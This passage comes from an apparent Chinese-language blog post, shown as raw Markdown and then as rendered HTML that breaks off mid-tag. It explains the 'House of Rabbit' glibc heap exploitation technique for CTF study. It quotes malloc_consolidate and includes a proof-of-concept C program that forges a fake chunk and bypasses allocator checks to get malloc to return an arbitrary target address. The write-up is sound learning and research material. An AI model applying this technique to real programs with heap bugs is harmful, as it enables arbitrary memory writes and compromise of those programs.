printf(\"\\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\\033[0m\\n\");\n    printf(\"第二次申请a，a的地址：%p\\n\\n\",a-2);\n    free(a);\n\n\n    /*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/\n    printf(\"\\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\\033[0m\\n\");\n    a=malloc(0x10);\n    b=malloc(0x80);\n    printf(\"fast chunk a: %p\\n\",a-2);\n    printf(\"small chunk b: %p\\n\\n\",b-0x10);\n    \n    /*\n    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk\n    buf[0]是为了绕过_int_malloc中的检测，\n    buf[7]是为了绕过_int_free时调用的consolidate的检测。\n    */\n    buf[0]=0xfffffffffffffff0;/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/\n    buf[1]=0x0;\n    buf[2]=0;\n    buf[3]=0x21;\n    buf[4]=0;\n    buf[5]=0;\n    buf[6]=0;\n    buf[7]=1;  /*绕过malloc_consolidate 中的unlink操作*/\n    printf(\"\\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\\033[0m\\n\");\n    printf(\"这是fake chunk--buf[2]的地址: %p\\n\",buf+2);\n    printf(\"这是目标target的地址: %p\\n\",target);\n    printf(\"\\033[1;33m为了绕过检测而提前作的准备:\\033[0m;\\n\");\n    printf(\"buf[2]-0x10: %#lx\\n\",buf[0]);\n    printf(\"buf[2]+0x28: %#lx\\n\",buf[7]);\n    printf(\"buf[2]的size: %#lx\\n\\n\",buf[3]);\n\n    /*把a 放入fastbins ,把buf链入fastbin*/\n    printf(\"\\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\\033[0m\\n\");\n    free(a);\n    *a=(size_t)(&buf[2]);\n    /*触发malloc_consolidate*/\n    free(b);\n\n    /*申请大堆块把buf放进largebin，修改buf size*/\n    printf(\"\\033[1;33m先修改buf 的size，使其可以被放入large bin中:\\033[0m\\n\");\n    buf[3]=0xa00001;\n    b=malloc(0xa00000);\n    printf(\"buf[2]的size: %#lx\\n\\n\",buf[3]);\n    /*再次修改size*/\n    printf(\"\\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\\033[0m\\n\");\n    buf[3]=0xfffffffffffffff1;\n    /**/\n    c=malloc(0xffffffffffffff80);\n    d=malloc(0x10);\n    printf(\"分配到的d:%p\\n\",d);\n    printf(\"target: %p\\n\",target);\n    return 0;\n}\n```\n## 为什么fakechunk 后要设置1？\n```c\nif (!nextinuse) {\n\t      size += nextsize;\n\t      unlink(av, nextchunk, bck, fwd);\n\t    } else\n\t      clear_inuse_bit_at_offset(nextchunk, 0);\n```\n1. 这是因为后续free(b) ，触发malloc_consolidate,时会检测nextinuse。如果是0就会触发unlink，而我们的利用是不能走这条路的，所以为了绕过，就需要把nextinuse置1.\n2. 同时因为这个绕过在前，所以我们先将fakechunk 的size设置为很小的0x20，这样置1的位置也很近，更方便。\n3. 在检测中是nextinuse，因为我们的size为0。通过buf[6]+0，得到的还是buf[6]自己,所以只需要在这里置1就ok了.\n## 为什么fakechunk前要置0xfffffffffffffff0？\n\n![_int_malloc中的检测](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/d7c462933cf8847287b123a9d1dc54f5.png)\n\n1. 在后续malloc(c)是，也就将largebin 迁移到target的调用中，有检测。就是[buf+size] -size，当这个结果为0 时，才能正常进行。\n2. 因为我们将size设置为了0xfffffffffffffff0，所以[buf+size]要等于0xfffffffffffffff0。那么[buf+size]又是何处呢？\n3. 其实就是buf-0x10。图中的r15，就是我们之前链入fastbins 的地址。\n\n## 关键部分演示\n\n### 把buf链入fastbins\n\n![buf入fastbins](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png)\n\n### free b触发malloc_consolidate\n\n![触发malloc_consolidate](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png)\n### 把buf放入largebin\n\n![image-20250630033400440](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png)\n因为大小不够，所以会被放入large bin\n\n### malloc，迁移largebins\n\n![image-20250630033528949](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png)\n1. 这次大小足够了可以分配\n2. 这个偏移计算是$[（target-0x10）-buf]-0x10$\n\n### 分配target\n\n![image-20250630034203589](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png)\n下一步就可以分配到target了","slug":"heap/House of Rabbit","published":1,"date":"2025-06-29T19:44:51.449Z","updated":"2025-08-12T03:42:48.980Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ie001uuomy34clcruv","content":"<h1 id=\"House-of-Rabbit\"><a href=\"#House-of-Rabbit\" class=\"headerlink\" title=\"House of Rabbit\"></a>House of Rabbit</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​哎呀，也不知道怎么说，看CTFshow上的poc总有一种无力感，啥玩意也没有。那个注释吧，也就是把how2heap的注释翻译了一下吧。真感觉他自己过个几年回来看自己的poc，估计也不知道是怎么利用吧。反正感觉写得莫名其妙，描述的语言逻辑不清楚。好在看雪上有一篇精华帖，写得很好，讲到了关键点。<br>​现在就是自己重新分析，改一下他的poc吧。</p>\n<h2 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h2><p><strong>文件路径(malloc&#x2F;malloc.c)</strong></p>\n<h3 id=\"malloc-consolidate\"><a href=\"#malloc-consolidate\" class=\"headerlink\" title=\"malloc_consolidate\"></a>malloc_consolidate</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">malloc_consolidate</span><span class=\"params\">(mstate av)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mfastbinptr*    fb;                 <span class=\"comment\">/* current fastbin being consolidated */</span></span><br><span class=\"line\">  mfastbinptr*    maxfb;              <span class=\"comment\">/* last fastbin (for loop control) */</span></span><br><span class=\"line\">  mchunkptr       p;                  <span class=\"comment\">/* current chunk being consolidated */</span></span><br><span class=\"line\">  mchunkptr       nextp;              <span class=\"comment\">/* next chunk to consolidate */</span></span><br><span class=\"line\">  mchunkptr       unsorted_bin;       <span class=\"comment\">/* bin header */</span></span><br><span class=\"line\">  mchunkptr       first_unsorted;     <span class=\"comment\">/* chunk to link to */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* These have same use as in free() */</span></span><br><span class=\"line\">  mchunkptr       nextchunk;</span><br><span class=\"line\">  INTERNAL_SIZE_T size;</span><br><span class=\"line\">  INTERNAL_SIZE_T nextsize;</span><br><span class=\"line\">  INTERNAL_SIZE_T prevsize;</span><br><span class=\"line\">  <span class=\"type\">int</span>             nextinuse;</span><br><span class=\"line\">  mchunkptr       bck;</span><br><span class=\"line\">  mchunkptr       fwd;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class=\"line\"><span class=\"comment\">    yet been initialized, in which case do so below</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (get_max_fast () != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    clear_fastchunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\">    unsorted_bin = unsorted_chunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class=\"line\"><span class=\"comment\">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class=\"line\"><span class=\"comment\">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class=\"line\"><span class=\"comment\">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class=\"line\"><span class=\"comment\">      reused anyway.</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    maxfb = &amp;fastbin (av, NFASTBINS - <span class=\"number\">1</span>);</span><br><span class=\"line\">    fb = &amp;fastbin (av, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">      p = atomic_exchange_acq (fb, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (p != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">\t  check_inuse_chunk(av, p);</span><br><span class=\"line\">\t  nextp = p-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"comment\">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class=\"line\">\t  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class=\"line\">\t  nextchunk = chunk_at_offset(p, size);</span><br><span class=\"line\">\t  nextsize = chunksize(nextchunk);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">\t    prevsize = p-&gt;prev_size;</span><br><span class=\"line\">\t    size += prevsize;</span><br><span class=\"line\">\t    p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">\t    unlink(av, p, bck, fwd);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class=\"line\">\t    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (!nextinuse) &#123;</span><br><span class=\"line\">\t      size += nextsize;</span><br><span class=\"line\">\t      unlink(av, nextchunk, bck, fwd);</span><br><span class=\"line\">\t    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t      clear_inuse_bit_at_offset(nextchunk, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class=\"line\">\t    unsorted_bin-&gt;fd = p;</span><br><span class=\"line\">\t    first_unsorted-&gt;bk = p;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class=\"line\">\t      p-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t      p-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">\t    p-&gt;bk = unsorted_bin;</span><br><span class=\"line\">\t    p-&gt;fd = first_unsorted;</span><br><span class=\"line\">\t    set_foot(p, size);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t    size += nextsize;</span><br><span class=\"line\">\t    set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">\t    av-&gt;top = p;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> ( (p = nextp) != <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (fb++ != maxfb);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    malloc_init_state(av);</span><br><span class=\"line\">    check_malloc_state(av);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>判断是否初始化.若未初始化，则初始化.</li>\n<li>将fastbins清空。遍历fastbins.<ul>\n<li>向后合并(低地址),能合就合</li>\n<li>向前合并(高地址),能合就合</li>\n</ul>\n</li>\n<li>如果合并后与topchunk相邻则合并入topchunk.</li>\n<li>否则插入到unsortedbin 前面.</li>\n</ol>\n<h2 id=\"相关调用\"><a href=\"#相关调用\" class=\"headerlink\" title=\"相关调用\"></a>相关调用</h2><ol>\n<li><code>_int_malloc()</code>中调用<ul>\n<li>申请large chunk 时，且arena 存在fastbins chunk 触发</li>\n<li>申请small chunk时，victim&#x3D;&#x3D;0时触发(错误处理)</li>\n</ul>\n</li>\n<li><code>mtrim()</code>中调用</li>\n<li><code>__libc_mallopt()</code>中调用</li>\n<li><code>_int_free</code>中调用<ul>\n<li>释放到unsortedbin进行consolidation的过程中，在向前向后合并完成了以后，如果合并后大小大于0xffff，就检测fastbin chunk并进行合并</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"利用思路和条件\"><a href=\"#利用思路和条件\" class=\"headerlink\" title=\"利用思路和条件\"></a>利用思路和条件</h2><h3 id=\"思路-感觉更像流程\"><a href=\"#思路-感觉更像流程\" class=\"headerlink\" title=\"思路(感觉更像流程)\"></a>思路(感觉更像流程)</h3><ol>\n<li>申请大堆块，增加av-&gt;system_mem和触发grow_heap . 使heap空间初始化与.bss等段空间相邻 .</li>\n<li>在想要分配的地址(设为target)附近伪造fake chunk(设为buf)，然后申请一个fastbins(设为a)大小的  ，一个smallbin(设为b)大小的chunk。</li>\n<li>先将a 放入fastbins 中，通过溢出或者uaf 漏洞，将buf链入fastbins 中。通过free掉b，触发malloc_consodilate,把 fastbins清空且插入unsorted bin。<strong>因为a和b相邻所以都被合并到topchunk，而buf不相邻，所以会无法合并，而被插入到unsortedbin 中。</strong></li>\n<li>再次通过申请大堆块，把unosorted bin 放入large bin 中。当然，为了能成功的进入large bin，我们需要先修改buf的size在合理的范围。</li>\n<li>最后继续修改buf的size为0xfffffffffffffff1，再计算与target的偏移，申请偏移大小的堆块后，即可分配到target。</li>\n</ol>\n<h3 id=\"个人理解\"><a href=\"#个人理解\" class=\"headerlink\" title=\"个人理解\"></a>个人理解</h3><ol>\n<li>感觉关键在于第三步触发malloc_consodilate时，可以有一个把任意地址链入unsorted bin的机会。利用这个可以后续完成任意地址的分配。</li>\n<li>但是感觉前面的准备工作很多，第三步之后的部分和house of force 后续的手法差不多。一个是通过topchunk 与 target 的偏移；一个是利用large chunk 与 target 的偏移。</li>\n<li>如果按照上述流程的话，一开始就要申请两次大堆块。感觉有点明显（出题的话）。</li>\n<li>后续对fastbins chunk 合并时增加了检查，使得利用更加得困难。</li>\n</ol>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><ol>\n<li>首先就是对堆块的申请大小没有限制。在这个过程中，我们申请了极大的堆块，同时也有最小的堆块，如果堆块的大小被限制的话就很难搞。</li>\n<li>存在溢出漏洞，或者uaf。允许我们可以修改处于空闲状态的堆块的fd指针和size。</li>\n<li>中间不能有不能free的堆块。如果有自动申请的堆块，而且还不会被free，可能会卡我们位置。导致第三步的时候出现问题。（但感觉，有1,2 两点的话，应该也可以绕过。感觉加上这个应该会很好玩）。</li>\n</ol>\n<h2 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> target[<span class=\"number\">20</span>]=<span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span>  buf[<span class=\"number\">20</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">size_t</span>* a;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>* b;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>* c;</span><br><span class=\"line\">    <span class=\"type\">char</span>* d;</span><br><span class=\"line\">    <span class=\"comment\">/*申请两次大堆块，并free*/</span></span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m第一步申请一个大堆块然后free，使system-&gt;mem提升:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第一次申请a，a的地址：%p\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    </span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m第二次继续申请一个大堆块，然后free，触发heap_grow:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第二次申请a，a的地址：%p\\n\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*申请两个堆块，一个fastbins大小 ，一个smallbin大小*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m此时申请一个fast chunk，一个small chunk为后续利用作铺垫:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fast chunk a: %p\\n&quot;</span>,a<span class=\"number\">-2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;small chunk b: %p\\n\\n&quot;</span>,b<span class=\"number\">-0x10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    用来链入large bin的fake chunk,注意从buf[1]~buf[5]是我们的fake chunk</span></span><br><span class=\"line\"><span class=\"comment\">    buf[0]是为了绕过_int_malloc中的检测，</span></span><br><span class=\"line\"><span class=\"comment\">    buf[7]是为了绕过_int_free时调用的consolidate的检测。</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    buf[<span class=\"number\">0</span>]=<span class=\"number\">0xfffffffffffffff0</span>;<span class=\"comment\">/*在检测中会用size+buf[2] 与size 比较，结果为0才能正确绕过*/</span></span><br><span class=\"line\">    buf[<span class=\"number\">1</span>]=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">2</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0x21</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">4</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">5</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">6</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">7</span>]=<span class=\"number\">1</span>;  <span class=\"comment\">/*绕过malloc_consolidate 中的unlink操作*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m伪造一个fake chunk，并为绕过一些检测，在某些地方埋伏笔\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;这是fake chunk--buf[2]的地址: %p\\n&quot;</span>,buf+<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;这是目标target的地址: %p\\n&quot;</span>,target);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m为了绕过检测而提前作的准备:\\033[0m;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]-0x10: %#lx\\n&quot;</span>,buf[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]+0x28: %#lx\\n&quot;</span>,buf[<span class=\"number\">7</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]的size: %#lx\\n\\n&quot;</span>,buf[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*把a 放入fastbins ,把buf链入fastbin*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m先free a,在通过修改a的fd，把buf[2]链入，随后free b触发:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">    *a=(<span class=\"type\">size_t</span>)(&amp;buf[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"comment\">/*触发malloc_consolidate*/</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(b);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*申请大堆块把buf放进largebin，修改buf size*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m先修改buf 的size，使其可以被放入large bin中:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0xa00001</span>;</span><br><span class=\"line\">    b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa00000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;buf[2]的size: %#lx\\n\\n&quot;</span>,buf[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"comment\">/*再次修改size*/</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m把buf 的size 修改为很大，使得可以分配到我们的target：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    buf[<span class=\"number\">3</span>]=<span class=\"number\">0xfffffffffffffff1</span>;</span><br><span class=\"line\">    <span class=\"comment\">/**/</span></span><br><span class=\"line\">    c=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xffffffffffffff80</span>);</span><br><span class=\"line\">    d=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;分配到的d:%p\\n&quot;</span>,d);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;target: %p\\n&quot;</span>,target);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"为什么fakechunk-后要设置1？\"><a href=\"#为什么fakechunk-后要设置1？\" class=\"headerlink\" title=\"为什么fakechunk 后要设置1？\"></a>为什么fakechunk 后要设置1？</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!nextinuse) &#123;</span><br><span class=\"line\">\t      size += nextsize;</span><br><span class=\"line\">\t      unlink(av, nextchunk, bck, fwd);</span><br><span class=\"line\">\t    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t      clear_inuse_bit_at_offset(nextchunk, <span 